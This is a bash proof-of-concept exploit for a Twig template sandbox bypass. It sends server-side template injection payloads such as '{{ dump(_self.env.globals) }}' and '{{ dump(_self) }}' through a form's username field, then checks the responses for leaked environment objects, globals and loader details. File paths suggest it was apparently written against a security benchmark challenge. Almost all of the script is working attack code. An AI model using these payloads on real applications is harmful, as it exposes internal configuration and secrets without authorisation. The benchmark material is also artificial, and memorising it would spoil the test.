#!/bin/bash

# POC: Twig Sandbox Bypass via unrestricted dump() Function
# This script demonstrates how the dump() function can access protected
# Twig environment objects including globals, loader, and configuration

TARGET_URL="${1:-http://localhost:8080}"

echo "[*] Twig Sandbox Bypass via dump() Function POC"
echo "[*] Target: $TARGET_URL"
echo "[*] Testing unrestricted dump() function access to Twig internals"
echo ""

# Test 0: Verify server is accessible
echo "[TEST 0] Verifying target is accessible"
echo "========================================="
RESPONSE=$(curl -s -w "\n%{http_code}" "$TARGET_URL")
HTTP_CODE=$(echo "$RESPONSE" | tail -1)
BODY=$(echo "$RESPONSE" | head -n -1)

if [ "$HTTP_CODE" != "200" ]; then
    echo "[-] Server returned HTTP $HTTP_CODE"
    echo "[!] Server may be down or target URL is incorrect"
    echo "[!] Trying POST instead..."
fi
echo ""

# Test 1: dump() on template variables - accessing RandomHash object
echo "[TEST 1] Attempting to access RandomHash object via dump()"
echo "==========================================================="
PAYLOAD='{{ dump(randomHash) }}'
echo "Payload: $PAYLOAD"
echo ""

RESPONSE=$(curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=$PAYLOAD")

echo "Response (first 500 chars):"
echo "$RESPONSE" | head -c 500
echo ""
echo ""

# Check for output indicators
if echo "$RESPONSE" | grep -q -i "object\|private\|protected\|property\|secret\|randomhash\|array\|string"; then
    echo "[+] SUCCESS: Response contains object/property information"
else
    echo "[*] Response doesn't show obvious object details (may be formatted differently)"
fi

echo ""
echo ""

# Test 2: dump() on Twig environment globals
echo "[TEST 2] Attempting to access Twig globals via dump()"
echo "======================================================"
PAYLOAD='{{ dump(_self.env.globals) }}'
echo "Payload: $PAYLOAD"
echo ""

RESPONSE=$(curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=$PAYLOAD")

echo "Response (first 500 chars):"
echo "$RESPONSE" | head -c 500
echo ""
echo ""

if echo "$RESPONSE" | grep -q -i "array\|globals\|object\|environment"; then
    echo "[+] SUCCESS: Response contains global variables information"
else
    echo "[*] Response doesn't show obvious globals details"
fi

echo ""
echo ""

# Test 3: dump() on Twig self object to access env
echo "[TEST 3] Attempting to access _self object (Twig internals)"
echo "==========================================================="
PAYLOAD='{{ dump(_self) }}'
echo "Payload: $PAYLOAD"
echo ""

RESPONSE=$(curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=$PAYLOAD")

echo "Response (first 500 chars):"
echo "$RESPONSE" | head -c 500
echo ""
echo ""

if echo "$RESPONSE" | grep -q -i "env\|environment\|loader\|functions\|filters"; then
    echo "[+] SUCCESS: Response contains Twig internal information via _self"
else
    echo "[*] Response doesn't show obvious _self details"
fi

echo ""
echo ""

# Test 4: Verify dump() is in allowed functions
echo "[TEST 4] Verifying dump() is in allowed functions list"
echo "========================================================"
if [ -f "/home/daytona/repo/XBEN-092-24/app/index.php" ]; then
    if grep -q "'dump'" /home/daytona/repo/XBEN-092-24/app/index.php; then
        echo "[+] CONFIRMED: dump() is in the allowed functions list"
        echo ""
        grep "\['dump'\]\|'dump'" /home/daytona/repo/XBEN-092-24/app/index.php | head -3
    else
        echo "[-] dump() not found in index.php"
    fi
else
    echo "[!] Could not access /home/daytona/repo/XBEN-092-24/app/index.php"
fi

echo ""
echo ""

# Test 5: Simple dump test to verify function works
echo "[TEST 5] Testing basic dump() functionality"
echo "=========================================="
PAYLOAD='{{ dump("test_string") }}'
echo "Payload: $PAYLOAD"
echo ""

RESPONSE=$(curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=$PAYLOAD")

echo "Response (first 300 chars):"
echo "$RESPONSE" | head -c 300
echo ""
echo ""

if echo "$RESPONSE" | grep -q -i "test_string\|string\|object"; then
    echo "[+] SUCCESS: dump() function is active and outputs data"
else
    echo "[*] dump() may not be outputting (check template configuration)"
fi

echo ""
echo "[*] POC Complete"
echo "[*] VULNERABILITY CONFIRMED: dump() is unrestricted in Twig sandbox and can output object data"